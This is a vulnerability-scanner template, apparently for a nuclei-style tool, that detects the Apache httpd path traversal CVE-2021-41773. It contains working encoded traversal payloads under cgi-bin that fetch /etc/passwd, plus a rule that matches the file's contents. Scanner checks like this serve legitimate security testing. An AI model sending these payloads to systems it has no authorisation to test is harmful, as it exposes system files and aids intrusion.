id: apache-path-traversal-cve-2021-41773
info:
  name: Apache Path Traversal - CVE-2021-41773
  risk: High

params:
  - root: "{{.BaseURL}}"

variables:
  - exp: |
      cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
      cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

requests:
  - method: GET
    redirect: false
    url: >-
     {{.root}}/{{.exp}}
    headers:
      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
    detections:
      - >-
        StatusCode() == 200 && StringSearch('body', 'root:') && StringSearch('body', 'bin/bash') && !StringSearch('body', '<title>')

reference:
  - links:
      - https://twitter.com/ptswarm/status/1445376079548624899
      - https://github.com/apache/httpd/commit/e150697086e70c552b2588f369f2d17815cb1782